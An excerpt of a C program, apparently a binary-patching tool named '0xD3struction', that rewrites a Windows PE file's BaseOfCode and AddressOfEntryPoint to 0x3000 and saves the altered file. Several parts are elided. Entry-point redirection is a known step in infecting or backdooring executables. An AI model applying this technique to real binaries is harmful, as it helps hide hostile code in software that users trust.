...
int main(int argc, char * argv[])
{
	...
	printf("\t\t\t[0xD3struction] Changing IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint \n");
	printf("\tChanging IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint \n");
	printf("\tNEW START POINT OF APP \n");
	...
	printf("\tBaseOfCode: [BEFORE] 0x%08X\n",NTHeaders->OptionalHeader.BaseOfCode);
    NTHeaders->OptionalHeader.BaseOfCode = 0x00003000;
    printf("\tBaseOfCode: [AFTER] 0x%08X\n",NTHeaders->OptionalHeader.BaseOfCode);
	
	printf("\tAddressOfEntryPoint: [BEFORE] 0x%08X\n",NTHeaders->OptionalHeader.AddressOfEntryPoint);
    NTHeaders->OptionalHeader.AddressOfEntryPoint = 0x00003000;
    printf("\tAddressOfEntryPoint: [AFTER] 0x%08X\n",NTHeaders->OptionalHeader.AddressOfEntryPoint);
	
	if(!(ToWrite=fopen(Name,"wb"))) return 0;
	fwrite(FILE_BUFF,1,FILE_SIZE,ToWrite);
	fclose(ToWrite);
	
	printf("[+] FILE %s WITH NEW ADDRESS OF ENTRY POINT CREATED!\n\n",Name);
